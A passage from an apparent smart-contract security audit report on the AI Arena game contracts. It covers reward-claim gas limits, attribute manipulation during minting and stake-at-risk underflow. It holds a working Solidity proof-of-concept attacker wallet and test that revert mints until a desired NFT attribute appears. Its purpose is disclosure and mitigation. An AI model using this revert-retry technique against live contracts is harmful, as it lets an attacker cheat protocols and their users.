In the case of `claimNRN` function, it consumed more than 1M gas which is relatively less as compared to `claimRewards` function. But still it has potential to reach block gas limit.

Even for the users for whom these both functions doesn't reach block gas limit, it can be very expensive and difficult for them to claim their rewards if some rounds has passed.

### Tools Used

Foundry

### Recommended Mitigation Steps

It can be fixed by adding a parameter for the number of rounds to consider.

For `claimRewards` function, so the changes would look like:

<details>

```diff
function claimRewards(
    string[] calldata modelURIs,
    string[] calldata modelTypes,
-    uint256[2][] calldata customAttributes
+    uint256[2][] calldata customAttributes,
+    uint32 totalRoundsToConsider
)
    external
{
    uint256 winnersLength;
    uint32 claimIndex = 0;
    uint32 lowerBound = numRoundsClaimed[msg.sender];
+    require(lowerBound + totalRoundsToConsider < roundId, "MergingPool: totalRoundsToConsider exceeds the limit");
-    for (uint32 currentRound = lowerBound; currentRound < roundId; currentRound++) {
+    for (uint32 currentRound = lowerBound; currentRound < lowerBound + totalRoundsToConsider; currentRound++) {
        numRoundsClaimed[msg.sender] += 1;
        winnersLength = winnerAddresses[currentRound].length;
        for (uint32 j = 0; j < winnersLength; j++) {
            if (msg.sender == winnerAddresses[currentRound][j]) {
                _fighterFarmInstance.mintFromMergingPool(
                    msg.sender,
                    modelURIs[claimIndex],
                    modelTypes[claimIndex],
                    customAttributes[claimIndex]
                );
                claimIndex += 1;
            }
        }
    }
    if (claimIndex > 0) {
        emit Claimed(msg.sender, claimIndex);
    }
}
```
</details>

For `claimNRN` function, so the changes would look like:

<details>

```diff
- function claimNRN() external {
+ function claimNRN(uint32 totalRoundsToConsider) external {
    require(numRoundsClaimed[msg.sender] < roundId, "Already claimed NRNs for this period");
    uint256 claimableNRN = 0;
    uint256 nrnDistribution;
    uint32 lowerBound = numRoundsClaimed[msg.sender];
+    require(lowerBound + totalRoundsToConsider < roundId, "RankedBattle: totalRoundsToConsider exceeds the limit");
-    for (uint32 currentRound = lowerBound; currentRound < roundId; currentRound++) {
+    for (uint32 currentRound = lowerBound; currentRound < lowerBound + totalRoundsToConsider; currentRound++) {
        nrnDistribution = getNrnDistribution(currentRound);
        claimableNRN += (
            accumulatedPointsPerAddress[msg.sender][currentRound] * nrnDistribution
        ) / totalAccumulatedPoints[currentRound];
        numRoundsClaimed[msg.sender] += 1;
    }
    if (claimableNRN > 0) {
        amountClaimed[msg.sender] += claimableNRN;
        _neuronInstance.mint(msg.sender, claimableNRN);
        emit Claimed(msg.sender, claimableNRN);
    }
}
```
</details>

**[brandinho (AI Arena) confirmed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/868#issuecomment-2018276487)**

**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**
> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/12

**Status:** Mitigation confirmed. Full details in reports from [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/11), [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/15), and [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/49).



***

## [[M-05] Can mint NFT with the desired attributes by reverting transaction](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/376)
*Submitted by [klau5](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/376), also found by [klau5](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/408), [visualbits](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2033), [thank\_you](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2031), [dutra](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2022), d3e4 ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1991), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1973)), [andywer](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1949), [0xkaju](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1940), [PedroZurdo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1936), [shaka](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1912), [honey-k12](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1886), [Matue](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1790), [favelanky](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1788), 0xDetermination ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1778), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1775)), [BoRonGod](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1771), [bgsmallerbear](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1757), 0xGreyWolf ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1714), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1337)), [soliditywala](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1712), [PUSH0](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1698), [Tumelo\_Crypto](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1696), [Blank\_Space](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1692), [korok](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1686), [Greed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1678), givn ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1676), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1652)), [grearlake](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1668), [evmboi32](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1647), [juancito](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1638), [VAD37](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1602), [dimulski](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1579), [DanielArmstrong](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1548), [gesha17](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1502), [0xgrbr](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1487), FloatingPragma ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1428), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1404)), [n0kto](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1423), [0xaghas](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1400), [MidgarAudits](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1389), [0xBinChook](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1387), [Zac](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1338), [Tricko](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1310), alexzoid ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1306), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/210)), [immeas](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1271), [AlexCzm](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1246), [0xLogos](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1173), [ni8mare](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1132), [peter](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1128), [0xWallSecurity](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1107), [WoolCentaur](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1066), [0xlyov](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1054), [forkforkdog](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1048), [ke1caM](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1034), [Draiakoo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1017), [McToady](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/953), [web3pwn](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/902), [peanuts](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/871), [kaveyjoe](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/837), [cats](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/732), [lsaudit](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/721), [tallo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/639), [Tekken](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/635), [Silvermist](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/626), [lil\_eth](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/574), [desaperh](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/571), [Jorgect](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/545), [niser93](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/519), erosjohn ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/516), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/495), [3](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/481)), [fnanni](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/500), BARW ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/378), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/367), [3](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/365)), pa6kuda ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/330), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/329), [3](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/322), [4](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/315)), [t0x1c](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/295), [solmaxis69](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/266), [yotov721](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/236), [SpicyMeatball](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/192), [PoeAudits](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/161), [Daniel526](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/158), iamandreiski ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/133), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/132)), [tpiliposian](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/97), [kiqo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/83), [aslanbek](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/53), [haxatron](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/34), [0rpse](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/513), [sl1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2069), [Giorgio](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2049), [vnavascues](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2094), [Nyxaris](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1859), and [Pelz](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/578)*

All the attributes of the NFT that should be randomly determined are set in the same transaction which they're claimed. Therefore, if a user uses a contract wallet, they can intentionally revert the transaction and retry minting if they do not get the desired attribute.

<details>

```solidity
function _createNewFighter(
    address to, 
    uint256 dna, 
    string memory modelHash,
    string memory modelType, 
    uint8 fighterType,
    uint8 iconsType,
    uint256[2] memory customAttributes
) 
    private 
{  
    require(balanceOf(to) < MAX_FIGHTERS_ALLOWED);
    uint256 element; 
    uint256 weight;
    uint256 newDna;
    if (customAttributes[0] == 100) {
@>      (element, weight, newDna) = _createFighterBase(dna, fighterType);
    }
    else {
        element = customAttributes[0];
        weight = customAttributes[1];
        newDna = dna;
    }
    uint256 newId = fighters.length;

    bool dendroidBool = fighterType == 1;
@>  FighterOps.FighterPhysicalAttributes memory attrs = _aiArenaHelperInstance.createPhysicalAttributes(
        newDna,
        generation[fighterType],
        iconsType,
        dendroidBool
    );
    fighters.push(
        FighterOps.Fighter(
            weight,
            element,
            attrs,
            newId,
            modelHash,
            modelType,
            generation[fighterType],
            iconsType,
            dendroidBool
        )
    );
@>  _safeMint(to, newId);
    FighterOps.fighterCreatedEmitter(newId, weight, element, generation[fighterType]);
}

function _createFighterBase(
    uint256 dna, 
    uint8 fighterType
) 
    private 
    view 
    returns (uint256, uint256, uint256) 
{
    uint256 element = dna % numElements[generation[fighterType]];
    uint256 weight = dna % 31 + 65;
    uint256 newDna = fighterType == 0 ? dna : uint256(fighterType);
    return (element, weight, newDna);
}
```
</details>

### Proof of Concept

First, add the `PoCCanClaimSpecificAttributeByRevert` contract at the bottom of the FighterFarm.t.sol file. This contract represents a user-customizable contract wallet. If the user does not get an NFT with desired attributes, they can revert the transaction and retry minting again.

<details>

```solidity
contract PoCCanClaimSpecificAttributeByRevert {
    FighterFarm fighterFarm;
    address owner;

    constructor(FighterFarm _fighterFarm) {
        fighterFarm = _fighterFarm;
        owner = msg.sender;
    }

    function tryClaim(uint8[2] memory numToMint, bytes memory claimSignature, string[] memory claimModelHashes, string[] memory claimModelTypes) public {
        require(msg.sender == owner, "not owner");
        try fighterFarm.claimFighters(numToMint, claimSignature, claimModelHashes, claimModelTypes) {
            // success to get specific attribute NFT
        } catch {
            // try again next time
        }
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) public returns (bytes4){
        
        (,,uint256 weight,,,,) = fighterFarm.getAllFighterInfo(tokenId);
        require(weight == 95, "I don't want this attribute");

        return bytes4(keccak256(bytes("onERC721Received(address,address,uint256,bytes)")));
    }
}
```
</details>

Then, add this test to the FighterFarm.t.sol file and run it.

<details>

```solidity
function testPoCCanClaimSpecificAttributeByRevert() public {
    uint256 signerPrivateKey = 0xabc123;
    address _POC_DELEGATED_ADDRESS = vm.addr(signerPrivateKey);

    // setup fresh setting to use _POC_DELEGATED_ADDRESS
    _fighterFarmContract = new FighterFarm(_ownerAddress, _POC_DELEGATED_ADDRESS, _treasuryAddress);
    _helperContract = new AiArenaHelper(_probabilities);
    _mintPassContract = new AAMintPass(_ownerAddress, _POC_DELEGATED_ADDRESS);
    _mintPassContract.setFighterFarmAddress(address(_fighterFarmContract));
    _mintPassContract.setPaused(false);
    _gameItemsContract = new GameItems(_ownerAddress, _treasuryAddress);
    _voltageManagerContract = new VoltageManager(_ownerAddress, address(_gameItemsContract));
    _neuronContract = new Neuron(_ownerAddress, _treasuryAddress, _neuronContributorAddress);
    _rankedBattleContract = new RankedBattle(
        _ownerAddress, address(_fighterFarmContract), _POC_DELEGATED_ADDRESS, address(_voltageManagerContract)
    );
    _rankedBattleContract.instantiateNeuronContract(address(_neuronContract));
    _mergingPoolContract =
        new MergingPool(_ownerAddress, address(_rankedBattleContract), address(_fighterFarmContract));
    _fighterFarmContract.setMergingPoolAddress(address(_mergingPoolContract));
    _fighterFarmContract.instantiateAIArenaHelperContract(address(_helperContract));
    _fighterFarmContract.instantiateMintpassContract(address(_mintPassContract));
    _fighterFarmContract.instantiateNeuronContract(address(_neuronContract));
    _fighterFarmContract.setMergingPoolAddress(address(_mergingPoolContract));

    // --- PoC start ---
    address attacker_eoa = address(0x1337);
    vm.prank(attacker_eoa);
    PoCCanClaimSpecificAttributeByRevert attacker_contract_wallet = new PoCCanClaimSpecificAttributeByRevert(_fighterFarmContract);

    uint8[2] memory numToMint = [1, 0];
    
    string[] memory claimModelHashes = new string[](1);
    claimModelHashes[0] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";

    string[] memory claimModelTypes = new string[](1);
    claimModelTypes[0] = "original";
    
    // get sign
    vm.startPrank(_POC_DELEGATED_ADDRESS);
    bytes32 msgHash = keccak256(abi.encode(
        address(attacker_contract_wallet),
        numToMint[0],
        numToMint[1],
        0, // nftsClaimed[msg.sender][0],
        0 // nftsClaimed[msg.sender][1]
    ));

    bytes memory prefix = "\x19Ethereum Signed Message:\n32";
    bytes32 prefixedHash = keccak256(abi.encodePacked(prefix, msgHash));

    (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, prefixedHash);
    bytes memory claimSignature = abi.encodePacked(r, s, v);
    vm.stopPrank();

    for(uint160 i = 100; _fighterFarmContract.balanceOf(address(attacker_contract_wallet)) == 0; i++){
        vm.prank(attacker_eoa);
        attacker_contract_wallet.tryClaim(numToMint, claimSignature, claimModelHashes, claimModelTypes);

        // other user mints NFT, the fighters.length changes and DNA would be changed
        _mintFromMergingPool(address(i)); // random user claim their NFT
    }
   
    assertEq(_fighterFarmContract.balanceOf(address(attacker_contract_wallet)), 1);
    uint256 tokenId = _fighterFarmContract.tokenOfOwnerByIndex(address(attacker_contract_wallet), 0);
    (,,uint256 weight,,,,) = _fighterFarmContract.getAllFighterInfo(tokenId);
    assertEq(weight, 95);
}
```
</details>

### Recommended Mitigation Steps

Users should only request minting, and attributes values should not be determined in the transaction called by the user. When a user claims an NFT, it should only mint the NFT and end. The attribute should be set by the admin or third-party like chainlink VRF after minting so that the user cannot manipulate it.

It’s not about lack of randomless problem, this is about setting attributes at same transaction when minting NFT. Even if you use chainlink, the same bug can happen if you set the attribute and mint NFTs in the same transaction.

**[brandinho (AI Arena) confirmed](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/376#issuecomment-2018190031)**

_Note: For full original discussion, see [here](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/376)._

**[AI Arena mitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation?tab=readme-ov-file#scope):**
> Updated dna generation in reRoll and updated dna generation in claimFighters.<br>
> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/11
> 
> Fixed dna generation in mintFromMergingPool.<br>
> https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/3

**Status:** Not fully mitigated. Full details in reports from [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/5), niser93 ([1](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/18), [2](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/17)), and d3e4 ([1](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/50), [2](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/55), [3](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/54)), and also included in the [Mitigation Review](#mitigation-review) section below.



***

## [[M-06] NFTs can be transferred even if StakeAtRisk remains, so the user's win cannot be recorded on the chain due to underflow, and can recover past losses that can't be recovered (steal protocol's token)](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/137)
*Submitted by [klau5](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/137), also found by [klau5](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1208), peanuts ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2062), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1192)), ubermensch ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2034), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1983), [3](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1977)), [denzi\_](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1972), [alexxander](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1894), [yotov721](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1893), [0xMosh](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1825), [evmboi32](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1795), 0xDetermination ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1789), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1786)), [alexzoid](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1730), AlexCzm ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1644), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1117)), [nuthan2x](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1641), ZanyBonzy ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1599), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1597)), [CodeWasp](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1546), DanielArmstrong ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1523), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1068)), [stakog](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1494), [14si2o\_Flint](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1478), [0xabhay](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1471), [KmanOfficial](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1457), [sl1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1417), [0xG0P1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1372), McToady ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1352), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/950)), [immeas](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1261), [Aymen0909](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1258), [merlin](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1129), [merlinboii](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1087), [ke1caM](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1031), [blutorque](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/931), 0xCiphky ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/927), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/920)), [Kalogerone](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/908), [lanrebayode77](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/849), [swizz](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/833), [JCN](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/673), handsomegiraffe ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/662), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/395)), [Kow](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/657), [WoolCentaur](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/637), [t0x1c](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/620), [shaflow2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/558), [Jorgect](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/550), Giorgio ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/529), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/520)), [jesjupyter](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/446), solmaxis69 ([1](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/442), [2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/411)), [0xAlix2](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/309), [SpicyMeatball](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/281), [csanuragjain](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/187), [haxatron](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/121), [VAD37](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1581), [FloatingPragma](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1432), [dipp](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2013), [vnavascues](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2000), [shaka](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1901), [KupiaSec](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1381), [tallo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/880), [almurhasan](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/796), [lil\_eth](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/566), and [djxploit](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/472)*

<https://github.com/code-423n4/2024-02-ai-arena/blob/1d18d1298729e443e14fea08149c77182a65da32/src/RankedBattle.sol#L285-L286><br>
<https://github.com/code-423n4/2024-02-ai-arena/blob/1d18d1298729e443e14fea08149c77182a65da32/src/RankedBattle.sol#L495-L496>

Cannot record a user's victory on-chain, and it may be possible to recover past losses (which should impossible).

### Proof of Concept

If you lose in a game, `_addResultPoints` is called, and the staked tokens move to the StakeAtRisk.

<details>

```solidity
function _addResultPoints(
    uint8 battleResult, 
    uint256 tokenId, 
    uint256 eloFactor, 
    uint256 mergingPortion,
    address fighterOwner
) 
    private 
{
    uint256 stakeAtRisk;
    uint256 curStakeAtRisk;
    uint256 points = 0;

    /// Check how many NRNs the fighter has at risk
    stakeAtRisk = _stakeAtRiskInstance.getStakeAtRisk(tokenId);
    ...

    /// Potential amount of NRNs to put at risk or retrieve from the stake-at-risk contract
@>  curStakeAtRisk = (bpsLostPerLoss * (amountStaked[tokenId] + stakeAtRisk)) / 10**4;
    if (battleResult == 0) {
        /// If the user won the match
        ...
    } else if (battleResult == 2) {
        /// If the user lost the match

        /// Do not allow users to lose more NRNs than they have in their staking pool
        if (curStakeAtRisk > amountStaked[tokenId]) {
@>          curStakeAtRisk = amountStaked[tokenId];
        }
        if (accumulatedPointsPerFighter[tokenId][roundId] > 0) {
            ...
        } else {
            /// If the fighter does not have any points for this round, NRNs become at risk of being lost
@>          bool success = _neuronInstance.transfer(_stakeAtRiskAddress, curStakeAtRisk);
            if (success) {
@>              _stakeAtRiskInstance.updateAtRiskRecords(curStakeAtRisk, tokenId, fighterOwner);
@>              amountStaked[tokenId] -= curStakeAtRisk;
            }
        }
    }
}
```
</details>

If a Fighter NFT has NRN tokens staked, that Fighter NFT is locked and cannot be transfered. When the tokens are unstaked and the remaining `amountStaked[tokenId]` becomes 0, the Fighter NFT is unlocked and it can be transfered. However, it does not check whether there are still tokens in the StakeAtRisk of the Fighter NFT.

<details>

```solidity
function unstakeNRN(uint256 amount, uint256 tokenId) external {
    require(_fighterFarmInstance.ownerOf(tokenId) == msg.sender, "Caller does not own fighter");
    if (amount > amountStaked[tokenId]) {
@>      amount = amountStaked[tokenId];
    }
    amountStaked[tokenId] -= amount;
    globalStakedAmount -= amount;
    stakingFactor[tokenId] = _getStakingFactor(
        tokenId, 
        _stakeAtRiskInstance.getStakeAtRisk(tokenId)
    );
    _calculatedStakingFactor[tokenId][roundId] = true;
    hasUnstaked[tokenId][roundId] = true;
    bool success = _neuronInstance.transfer(msg.sender, amount);
    if (success) {
        if (amountStaked[tokenId] == 0) {
@>          _fighterFarmInstance.updateFighterStaking(tokenId, false);
        }
        emit Unstaked(msg.sender, amount);
    }
}
```
</details>

Unstaked Fighter NFTs can now be traded on the secondary market. Suppose another user buys this Fighter NFT with remaining StakeAtRisk.

Normally, if you win a game, you can call `reclaimNRN` to get the tokens back from StakeAtRisk.

<details>

```solidity
function _addResultPoints(
    uint8 battleResult, 
    uint256 tokenId, 
    uint256 eloFactor, 
    uint256 mergingPortion,
    address fighterOwner
) 
    private 
{
    uint256 stakeAtRisk;
    uint256 curStakeAtRisk;
    uint256 points = 0;

    /// Check how many NRNs the fighter has at risk
@>  stakeAtRisk = _stakeAtRiskInstance.getStakeAtRisk(tokenId);

    ...
    /// Potential amount of NRNs to put at risk or retrieve from the stake-at-risk contract
@>  curStakeAtRisk = (bpsLostPerLoss * (amountStaked[tokenId] + stakeAtRisk)) / 10**4;
    if (battleResult == 0) {
        /// If the user won the match
        ...

        /// Do not allow users to reclaim more NRNs than they have at risk
        if (curStakeAtRisk > stakeAtRisk) {
@>          curStakeAtRisk = stakeAtRisk;
        }

        /// If the user has stake-at-risk for their fighter, reclaim a portion
        /// Reclaiming stake-at-risk puts the NRN back into their staking pool
@>      if (curStakeAtRisk > 0) {
@>          _stakeAtRiskInstance.reclaimNRN(curStakeAtRisk, tokenId, fighterOwner);
            amountStaked[tokenId] += curStakeAtRisk;
        }
        ...
    } else if (battleResult == 2) {
        ...
    }
}
```
</details>

However, if a new user becomes the owner of the Fighter NFT, it does not work as intended.

The `_addResultPoints` might revert due to the underflow at `reclaimNRN`'s `amountLost[fighterOwner] -= nrnToReclaim`. Therefore, the new owner cannot record a victory on-chain with the purchased NFT until the end of this round.

```solidity
function getStakeAtRisk(uint256 fighterId) external view returns(uint256) {
@>  return stakeAtRisk[roundId][fighterId];
}

function reclaimNRN(uint256 nrnToReclaim, uint256 fighterId, address fighterOwner) external {
    require(msg.sender == _rankedBattleAddress, "Call must be from RankedBattle contract");
    require(
        stakeAtRisk[roundId][fighterId] >= nrnToReclaim, 
        "Fighter does not have enough stake at risk"
    );

    bool success = _neuronInstance.transfer(_rankedBattleAddress, nrnToReclaim);
    if (success) {
        stakeAtRisk[roundId][fighterId] -= nrnToReclaim;
        totalStakeAtRisk[roundId] -= nrnToReclaim;
@>      amountLost[fighterOwner] -= nrnToReclaim;
        emit ReclaimedStake(fighterId, nrnToReclaim);
    }
}
```

Even if the new owner already has another NFT and has a sufficient amount of `amountLost[fighterOwner]`, there is a problem.

*   Alice buy the NFT2(tokenId 2) from the secondary market, which has 30 stakeAtRisk.
    *   stakeAtRisk of NFT2: 30
    *   amountLost: 0
*   Alice also owns the NFT1(tokenId 1) and has 100 stakeAtRisk in the same round.
    *   stakeAtRisk of NFT1: 100
    *   stakeAtRisk of NFT2: 30
    *   amountLost: 100
*   Alice wins with the NFT2 and reclaims 30 stakeAtRisk.
    *   stakeAtRisk of NFT1: 100
    *   stakeAtRisk of NFT2: 0
    *   amountLost: 70
*   If Alice tries to reclaim stakeAtRisk of NFT1, an underflow occurs and it reverts when remaining stakeAtRisk is 30.
    *   stakeAtRisk of NFT1: 30
    *   stakeAtRisk of NFT2: 0
    *   amountLost: 0
*   Alice will no longer be able to record a win for NFT1 due to underflow.

There is a problem even if the user owns a sufficient amount of `amountLost[fighterOwner]` and does not have stakeAtRisk of another NFT in the current round. In this case, the user can steal the protocol's token.

*   Alice owns NFT1 and had 100 stakeAtRisk with NFT1 at past round.
    *   Since the round has already passed, this loss of 100 NRN is a past loss that can no longer be recovered.
